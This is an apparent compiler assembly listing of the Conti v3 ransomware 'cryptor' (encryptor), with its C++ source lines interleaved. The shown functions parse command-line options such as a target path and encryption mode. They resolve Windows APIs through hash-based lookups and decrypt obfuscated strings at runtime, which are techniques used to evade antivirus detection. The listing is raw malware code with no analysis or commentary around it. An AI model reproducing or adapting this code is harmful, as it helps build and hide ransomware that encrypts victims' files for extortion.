  00058	48 8b d5	 mov	 rdx, rbp
  0005b	48 8b cf	 mov	 rcx, rdi
  0005e	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 99   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00060	85 c0		 test	 eax, eax
  00062	74 25		 je	 SHORT $LN11@FindComman

; 95   : 		return FALSE;
; 96   : 	}
; 97   : 
; 98   : 	for (INT i = 1; i < Argc; i++) {

  00064	48 ff c3	 inc	 rbx
  00067	48 3b de	 cmp	 rbx, rsi
  0006a	7c d4		 jl	 SHORT $LL4@FindComman
$LN3@FindComman:

; 101  : 		}
; 102  : 	}
; 103  : 	
; 104  : 	return FALSE;

  0006c	33 c0		 xor	 eax, eax
$LN1@FindComman:

; 105  : }

  0006e	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  00073	48 8b 6c 24 38	 mov	 rbp, QWORD PTR [rsp+56]
  00078	48 8b 74 24 40	 mov	 rsi, QWORD PTR [rsp+64]
  0007d	48 8b 7c 24 48	 mov	 rdi, QWORD PTR [rsp+72]
  00082	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00086	41 5e		 pop	 r14
  00088	c3		 ret	 0
$LN11@FindComman:

; 100  : 			return TRUE;

  00089	b8 01 00 00 00	 mov	 eax, 1
  0008e	eb de		 jmp	 SHORT $LN1@FindComman
?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z ENDP		; FindCommandLineArg
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT ?ConvertSizeStr@@YAHPEA_W@Z
_TEXT	SEGMENT
SizeStr$ = 80
?ConvertSizeStr@@YAHPEA_W@Z PROC			; ConvertSizeStr, COMDAT

; 113  : {

$LN62:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 6c 24 10	 mov	 QWORD PTR [rsp+16], rbp
  0000a	48 89 74 24 18	 mov	 QWORD PTR [rsp+24], rsi
  0000f	48 89 7c 24 20	 mov	 QWORD PTR [rsp+32], rdi
  00014	41 56		 push	 r14
  00016	48 83 ec 40	 sub	 rsp, 64			; 00000040H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 60   : 	pFunction = (INT(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe27a325f, 108);//GetProcAddress(hKernel32, OBFA("lstrlenW"));

  0001a	ba 0f 00 00 00	 mov	 edx, 15
  0001f	41 b8 5f 32 7a
	e2		 mov	 r8d, -495308193		; e27a325fH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 113  : {

  00025	48 8b f1	 mov	 rsi, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 60   : 	pFunction = (INT(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe27a325f, 108);//GetProcAddress(hKernel32, OBFA("lstrlenW"));

  00028	44 8d 4a 5d	 lea	 r9d, QWORD PTR [rdx+93]
  0002c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 61   : 	return pFunction(lpString);

  00031	48 8b ce	 mov	 rcx, rsi
  00034	ff d0		 call	 rax

; 1191 : 	pFunction = (int(WINAPI*)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x7ae2521c, 9);

  00036	ba 0f 00 00 00	 mov	 edx, 15
  0003b	41 b8 1c 52 e2
	7a		 mov	 r8d, 2061652508		; 7ae2521cH

; 61   : 	return pFunction(lpString);

  00041	8b d8		 mov	 ebx, eax

; 1191 : 	pFunction = (int(WINAPI*)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x7ae2521c, 9);

  00043	44 8d 4a fa	 lea	 r9d, QWORD PTR [rdx-6]
  00047	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1192 : 	return pFunction(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);

  0004c	45 33 f6	 xor	 r14d, r14d
  0004f	44 8b cb	 mov	 r9d, ebx
  00052	4c 89 74 24 38	 mov	 QWORD PTR [rsp+56], r14
  00057	4c 8b c6	 mov	 r8, rsi
  0005a	4c 89 74 24 30	 mov	 QWORD PTR [rsp+48], r14
  0005f	33 d2		 xor	 edx, edx
  00061	44 89 74 24 28	 mov	 DWORD PTR [rsp+40], r14d
  00066	b9 e9 fd 00 00	 mov	 ecx, 65001		; 0000fde9H
  0006b	4c 89 74 24 20	 mov	 QWORD PTR [rsp+32], r14
  00070	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 115  : 	if (!NeedLength) {

  00072	85 c0		 test	 eax, eax
  00074	0f 84 17 01 00
	00		 je	 $LN47@ConvertSiz

; 116  : 		return 0;
; 117  : 	}
; 118  : 
; 119  : 	LPSTR Utf8String = (LPSTR)m_malloc(NeedLength + 1);

  0007a	48 63 d8	 movsxd	 rbx, eax
  0007d	8d 68 01	 lea	 ebp, DWORD PTR [rax+1]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  00080	48 8d 4b 01	 lea	 rcx, QWORD PTR [rbx+1]
  00084	e8 00 00 00 00	 call	 malloc

; 6    : 	memset(mem, 0, Size);

  00089	4c 8d 43 01	 lea	 r8, QWORD PTR [rbx+1]
  0008d	33 d2		 xor	 edx, edx
  0008f	48 8b c8	 mov	 rcx, rax
  00092	48 8b f8	 mov	 rdi, rax
  00095	e8 00 00 00 00	 call	 memset
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 120  : 	if (!Utf8String) {

  0009a	48 85 ff	 test	 rdi, rdi
  0009d	0f 84 ee 00 00
	00		 je	 $LN47@ConvertSiz
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 60   : 	pFunction = (INT(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe27a325f, 108);//GetProcAddress(hKernel32, OBFA("lstrlenW"));

  000a3	41 8d 56 0f	 lea	 edx, QWORD PTR [r14+15]
  000a7	41 b8 5f 32 7a
	e2		 mov	 r8d, -495308193		; e27a325fH
  000ad	45 8d 4e 6c	 lea	 r9d, QWORD PTR [r14+108]
  000b1	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 61   : 	return pFunction(lpString);

  000b6	48 8b ce	 mov	 rcx, rsi
  000b9	ff d0		 call	 rax

; 1191 : 	pFunction = (int(WINAPI*)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x7ae2521c, 9);

  000bb	41 8d 56 0f	 lea	 edx, QWORD PTR [r14+15]
  000bf	41 b8 1c 52 e2
	7a		 mov	 r8d, 2061652508		; 7ae2521cH
  000c5	45 8d 4e 09	 lea	 r9d, QWORD PTR [r14+9]

; 61   : 	return pFunction(lpString);

  000c9	8b d8		 mov	 ebx, eax

; 1191 : 	pFunction = (int(WINAPI*)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x7ae2521c, 9);

  000cb	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1192 : 	return pFunction(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);

  000d0	4c 89 74 24 38	 mov	 QWORD PTR [rsp+56], r14
  000d5	44 8b cb	 mov	 r9d, ebx
  000d8	4c 89 74 24 30	 mov	 QWORD PTR [rsp+48], r14
  000dd	4c 8b c6	 mov	 r8, rsi
  000e0	89 6c 24 28	 mov	 DWORD PTR [rsp+40], ebp
  000e4	33 d2		 xor	 edx, edx
  000e6	b9 e9 fd 00 00	 mov	 ecx, 65001		; 0000fde9H
  000eb	48 89 7c 24 20	 mov	 QWORD PTR [rsp+32], rdi
  000f0	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 22   : 	unsigned int i = 0;

  000f2	41 8b ce	 mov	 ecx, r14d
  000f5	45 8b ce	 mov	 r9d, r14d

; 23   : 	while (str[i] != '\0') {

  000f8	38 0f		 cmp	 BYTE PTR [rdi], cl
  000fa	74 10		 je	 SHORT $LN17@ConvertSiz
  000fc	0f 1f 40 00	 npad	 4
$LL16@ConvertSiz:

; 24   : 		strLen += 1;

  00100	41 ff c1	 inc	 r9d

; 25   : 		i++;

  00103	8d 49 01	 lea	 ecx, DWORD PTR [rcx+1]
  00106	44 38 34 39	 cmp	 BYTE PTR [rcx+rdi], r14b
  0010a	75 f4		 jne	 SHORT $LL16@ConvertSiz
$LN17@ConvertSiz:

; 26   : 	}
; 27   : 
; 28   : 	int num = 0;

  0010c	45 8b d6	 mov	 r10d, r14d

; 29   : 	int ten;
; 30   : 	BOOL signFlag = TRUE; //true: +, false: -

  0010f	41 bb 01 00 00
	00		 mov	 r11d, 1

; 31   : 	for (i = 0; i < strLen; i++) {

  00115	41 8b d6	 mov	 edx, r14d
  00118	45 85 c9	 test	 r9d, r9d
  0011b	74 6f		 je	 SHORT $LN45@ConvertSiz
  0011d	0f 1f 00	 npad	 3
$LL20@ConvertSiz:

; 32   : 		if (str[i] < '0' || str[i] > '9') {

  00120	44 0f be 07	 movsx	 r8d, BYTE PTR [rdi]
  00124	41 8d 40 d0	 lea	 eax, DWORD PTR [r8-48]
  00128	3c 09		 cmp	 al, 9
  0012a	77 2b		 ja	 SHORT $LN25@ConvertSiz

; 43   : 		}
; 44   : 
; 45   : 		ten = 1;
; 46   : 		for (unsigned int j = 0; j < strLen - 1 - i; j++) {

  0012c	41 8b c9	 mov	 ecx, r9d
  0012f	b8 01 00 00 00	 mov	 eax, 1
  00134	2b ca		 sub	 ecx, edx
  00136	2b c8		 sub	 ecx, eax
  00138	74 11		 je	 SHORT $LN22@ConvertSiz
  0013a	66 0f 1f 44 00
	00		 npad	 6
$LL37@ConvertSiz:

; 47   : 			ten *= 10;

  00140	8d 04 80	 lea	 eax, DWORD PTR [rax+rax*4]
  00143	03 c0		 add	 eax, eax
  00145	48 83 e9 01	 sub	 rcx, 1
  00149	75 f5		 jne	 SHORT $LL37@ConvertSiz
$LN22@ConvertSiz:

; 48   : 		}
; 49   : 
; 50   : 		num += ten * (str[i] - '0');

  0014b	41 8d 48 d0	 lea	 ecx, DWORD PTR [r8-48]
  0014f	0f af c8	 imul	 ecx, eax
  00152	44 03 d1	 add	 r10d, ecx

; 51   : 	}

  00155	eb 1b		 jmp	 SHORT $LN18@ConvertSiz
$LN25@ConvertSiz:

; 33   : 			if (i == 0 && str[i] == '-') {

  00157	85 d2		 test	 edx, edx
  00159	75 2e		 jne	 SHORT $LN27@ConvertSiz
  0015b	41 80 f8 2d	 cmp	 r8b, 45			; 0000002dH
  0015f	75 05		 jne	 SHORT $LN46@ConvertSiz

; 34   : 				signFlag = FALSE;

  00161	45 8b de	 mov	 r11d, r14d

; 35   : 				continue;

  00164	eb 0c		 jmp	 SHORT $LN18@ConvertSiz
$LN46@ConvertSiz:

; 36   : 			}
; 37   : 			if (i == 0 && str[i] == '+') {

  00166	41 80 f8 2b	 cmp	 r8b, 43			; 0000002bH
  0016a	75 1d		 jne	 SHORT $LN27@ConvertSiz

; 38   : 				signFlag = TRUE;

  0016c	41 bb 01 00 00
	00		 mov	 r11d, 1
$LN18@ConvertSiz:

; 31   : 	for (i = 0; i < strLen; i++) {

  00172	ff c2		 inc	 edx
  00174	48 ff c7	 inc	 rdi
  00177	41 3b d1	 cmp	 edx, r9d
  0017a	72 a4		 jb	 SHORT $LL20@ConvertSiz

; 52   : 
; 53   : 	if (signFlag) {

  0017c	45 85 db	 test	 r11d, r11d
  0017f	75 0b		 jne	 SHORT $LN45@ConvertSiz

; 54   : 		return num;
; 55   : 	}
; 56   : 	else {
; 57   : 		return -num;

  00181	41 f7 da	 neg	 r10d

; 122  : 	}
; 123  : 
; 124  : 	pWideCharToMultiByte(CP_UTF8, 0, SizeStr, plstrlenW(SizeStr), Utf8String, NeedLength + 1, NULL, NULL);
; 125  : 
; 126  : 	return SToI(Utf8String);

  00184	41 8b c2	 mov	 eax, r10d
  00187	eb 0a		 jmp	 SHORT $LN1@ConvertSiz
$LN27@ConvertSiz:

; 42   : 			return 0;

  00189	45 8b d6	 mov	 r10d, r14d
$LN45@ConvertSiz:

; 122  : 	}
; 123  : 
; 124  : 	pWideCharToMultiByte(CP_UTF8, 0, SizeStr, plstrlenW(SizeStr), Utf8String, NeedLength + 1, NULL, NULL);
; 125  : 
; 126  : 	return SToI(Utf8String);

  0018c	41 8b c2	 mov	 eax, r10d
  0018f	eb 02		 jmp	 SHORT $LN1@ConvertSiz
$LN47@ConvertSiz:

; 121  : 		return 0;

  00191	33 c0		 xor	 eax, eax
$LN1@ConvertSiz:

; 127  : }

  00193	48 8b 5c 24 50	 mov	 rbx, QWORD PTR [rsp+80]
  00198	48 8b 6c 24 58	 mov	 rbp, QWORD PTR [rsp+88]
  0019d	48 8b 74 24 60	 mov	 rsi, QWORD PTR [rsp+96]
  001a2	48 8b 7c 24 68	 mov	 rdi, QWORD PTR [rsp+104]
  001a7	48 83 c4 40	 add	 rsp, 64			; 00000040H
  001ab	41 5e		 pop	 r14
  001ad	c3		 ret	 0
?ConvertSizeStr@@YAHPEA_W@Z ENDP			; ConvertSizeStr
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\global\global_parameters.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT ?HandleCommandLine@@YAHPEA_W@Z
_TEXT	SEGMENT
tv192 = 64
$T1 = 64
$T2 = 72
$T7 = 80
$T9 = 96
$T3 = 112
$T4 = 128
$T8 = 144
$T10 = 160
$T5 = 184
EncryptMode$1$ = 208
Path$1$ = 216
LogFile$1$ = 224
Argc$ = 232
__$ArrayPad$ = 240
CmdLine$ = 304
?HandleCommandLine@@YAHPEA_W@Z PROC			; HandleCommandLine, COMDAT

; 132  : {

$LN527:
  00000	40 55		 push	 rbp
  00002	53		 push	 rbx
  00003	41 55		 push	 r13
  00005	41 56		 push	 r14
  00007	48 8d 6c 24 f8	 lea	 rbp, QWORD PTR [rsp-8]
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0001a	48 33 c4	 xor	 rax, rsp
  0001d	48 89 45 f0	 mov	 QWORD PTR __$ArrayPad$[rbp-256], rax

; 133  : 	INT Argc = 0;

  00021	45 33 ed	 xor	 r13d, r13d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 702  : 	pFunction = (LPWSTR * (WINAPI*)(LPCWSTR, int*))getapi::GetProcAddressEx2(NULL, SHELL32_MODULE_ID, 0x6dd8e1ea, 48);//GetProcAddress(hShell32, OBFA("CommandLineToArgvW"));

  00024	41 b8 ea e1 d8
	6d		 mov	 r8d, 1842930154		; 6dd8e1eaH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 132  : {

  0002a	48 8b d9	 mov	 rbx, rcx

; 133  : 	INT Argc = 0;

  0002d	44 89 6d e8	 mov	 DWORD PTR Argc$[rbp-256], r13d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 702  : 	pFunction = (LPWSTR * (WINAPI*)(LPCWSTR, int*))getapi::GetProcAddressEx2(NULL, SHELL32_MODULE_ID, 0x6dd8e1ea, 48);//GetProcAddress(hShell32, OBFA("CommandLineToArgvW"));

  00031	41 8d 55 17	 lea	 edx, QWORD PTR [r13+23]
  00035	45 8d 4d 30	 lea	 r9d, QWORD PTR [r13+48]
  00039	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 703  : 	return pFunction(lpCmdLine, pNumArgs);

  0003e	48 8d 55 e8	 lea	 rdx, QWORD PTR Argc$[rbp-256]
  00042	48 8b cb	 mov	 rcx, rbx
  00045	ff d0		 call	 rax
  00047	4c 8b f0	 mov	 r14, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 135  : 	if (!Argv) {

  0004a	48 85 c0	 test	 rax, rax
  0004d	0f 84 f0 09 00
	00		 je	 $LN1@HandleComm
$LN2@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00053	44 88 6c 24 40	 mov	 BYTE PTR $T1[rsp], r13b
  00058	c6 44 24 41 4e	 mov	 BYTE PTR $T1[rsp+1], 78	; 0000004eH
  0005d	c6 44 24 42 0f	 mov	 BYTE PTR $T1[rsp+2], 15
  00062	c6 44 24 43 79	 mov	 BYTE PTR $T1[rsp+3], 121 ; 00000079H
  00067	c6 44 24 44 0f	 mov	 BYTE PTR $T1[rsp+4], 15
  0006c	c6 44 24 45 0f	 mov	 BYTE PTR $T1[rsp+5], 15
  00071	c6 44 24 46 0f	 mov	 BYTE PTR $T1[rsp+6], 15
  00076	0f b6 44 24 41	 movzx	 eax, BYTE PTR $T1[rsp+1]

; 58   :         return m_isDecrypted;

  0007b	0f b6 44 24 40	 movzx	 eax, BYTE PTR $T1[rsp]
  00080	4c 89 a4 24 48
	01 00 00	 mov	 QWORD PTR [rsp+328], r12
  00088	4c 89 bc 24 00
	01 00 00	 mov	 QWORD PTR [rsp+256], r15

; 63   :         if (!isDecrypted())

  00090	84 c0		 test	 al, al
  00092	75 61		 jne	 SHORT $LN35@HandleComm

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00094	4d 8b cd	 mov	 r9, r13
  00097	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL36@HandleComm:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  000a0	42 0f b6 4c 0c
	41		 movzx	 ecx, BYTE PTR $T1[rsp+r9+1]

; 40   :     return (a % n + n) % n;

  000a6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  000ab	83 e9 0f	 sub	 ecx, 15
  000ae	44 6b c1 25	 imul	 r8d, ecx, 37		; 00000025H

; 40   :     return (a % n + n) % n;

  000b2	41 f7 e8	 imul	 r8d
  000b5	41 03 d0	 add	 edx, r8d
  000b8	c1 fa 06	 sar	 edx, 6
  000bb	8b c2		 mov	 eax, edx
  000bd	c1 e8 1f	 shr	 eax, 31
  000c0	03 d0		 add	 edx, eax
  000c2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  000c5	44 2b c0	 sub	 r8d, eax
  000c8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  000cd	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  000d1	41 f7 e8	 imul	 r8d
  000d4	41 03 d0	 add	 edx, r8d
  000d7	c1 fa 06	 sar	 edx, 6
  000da	8b c2		 mov	 eax, edx
  000dc	c1 e8 1f	 shr	 eax, 31
  000df	03 d0		 add	 edx, eax
  000e1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  000e4	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  000e7	46 88 44 0c 41	 mov	 BYTE PTR $T1[rsp+r9+1], r8b
  000ec	49 ff c1	 inc	 r9
  000ef	49 83 f9 06	 cmp	 r9, 6
  000f3	72 ab		 jb	 SHORT $LL36@HandleComm
$LN35@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 139  : 	LPWSTR Path = GetCommandLineArg(Argv, Argc, OBFW(L"-p"));

  000f5	4c 63 65 e8	 movsxd	 r12, DWORD PTR Argc$[rbp-256]
  000f9	48 89 b4 24 38
	01 00 00	 mov	 QWORD PTR [rsp+312], rsi
  00101	48 89 bc 24 40
	01 00 00	 mov	 QWORD PTR [rsp+320], rdi
  00109	41 83 fc 01	 cmp	 r12d, 1

; 69   : 	if (Argc <= 1) {

  0010d	7e 4e		 jle	 SHORT $LN483@HandleComm

; 70   : 		return NULL;
; 71   : 	}
; 72   : 
; 73   : 	for (INT i = 1; i < Argc; i++) {

  0010f	41 bf 01 00 00
	00		 mov	 r15d, 1
  00115	4d 3b e7	 cmp	 r12, r15
  00118	7e 43		 jle	 SHORT $LN483@HandleComm
  0011a	41 8b ff	 mov	 edi, r15d
  0011d	41 8d 77 01	 lea	 esi, QWORD PTR [r15+1]
$LL48@HandleComm:

; 74   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00121	49 8b 1c fe	 mov	 rbx, QWORD PTR [r14+rdi*8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00125	ba 0f 00 00 00	 mov	 edx, 15
  0012a	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  00130	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  00134	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

  00139	48 8d 54 24 41	 lea	 rdx, QWORD PTR $T1[rsp+1]
  0013e	48 8b cb	 mov	 rcx, rbx
  00141	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 74   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00143	85 c0		 test	 eax, eax
  00145	75 09		 jne	 SHORT $LN46@HandleComm

; 75   : 
; 76   : 			if ((i + 1) < Argc) {

  00147	41 3b f4	 cmp	 esi, r12d
  0014a	0f 8c 0a 05 00
	00		 jl	 $LN436@HandleComm
$LN46@HandleComm:

; 70   : 		return NULL;
; 71   : 	}
; 72   : 
; 73   : 	for (INT i = 1; i < Argc; i++) {

  00150	41 ff c7	 inc	 r15d
  00153	ff c6		 inc	 esi
  00155	48 ff c7	 inc	 rdi
  00158	49 3b fc	 cmp	 rdi, r12
  0015b	7c c4		 jl	 SHORT $LL48@HandleComm
$LN483@HandleComm:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0015d	4c 89 6d d8	 mov	 QWORD PTR Path$1$[rbp-256], r13
$LN45@HandleComm:
  00161	c6 44 24 48 00	 mov	 BYTE PTR $T2[rsp], 0
  00166	c6 44 24 49 15	 mov	 BYTE PTR $T2[rsp+1], 21
  0016b	c6 44 24 4a 50	 mov	 BYTE PTR $T2[rsp+2], 80	; 00000050H
  00170	c6 44 24 4b 02	 mov	 BYTE PTR $T2[rsp+3], 2
  00175	c6 44 24 4c 50	 mov	 BYTE PTR $T2[rsp+4], 80	; 00000050H
  0017a	c6 44 24 4d 50	 mov	 BYTE PTR $T2[rsp+5], 80	; 00000050H
  0017f	c6 44 24 4e 50	 mov	 BYTE PTR $T2[rsp+6], 80	; 00000050H
  00184	0f b6 44 24 49	 movzx	 eax, BYTE PTR $T2[rsp+1]

; 58   :         return m_isDecrypted;

  00189	0f b6 44 24 48	 movzx	 eax, BYTE PTR $T2[rsp]

; 63   :         if (!isDecrypted())

  0018e	84 c0		 test	 al, al
  00190	75 66		 jne	 SHORT $LN71@HandleComm

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00192	4d 8b cd	 mov	 r9, r13
  00195	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL72@HandleComm:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  001a0	42 0f b6 4c 0c
	49		 movzx	 ecx, BYTE PTR $T2[rsp+r9+1]

; 40   :     return (a % n + n) % n;

  001a6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  001ab	83 e9 50	 sub	 ecx, 80			; 00000050H
  001ae	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  001b2	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  001b5	41 f7 e8	 imul	 r8d
  001b8	41 03 d0	 add	 edx, r8d
  001bb	c1 fa 06	 sar	 edx, 6
  001be	8b c2		 mov	 eax, edx
  001c0	c1 e8 1f	 shr	 eax, 31
  001c3	03 d0		 add	 edx, eax
  001c5	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  001c8	44 2b c0	 sub	 r8d, eax
  001cb	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  001d0	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  001d4	41 f7 e8	 imul	 r8d
  001d7	41 03 d0	 add	 edx, r8d
  001da	c1 fa 06	 sar	 edx, 6
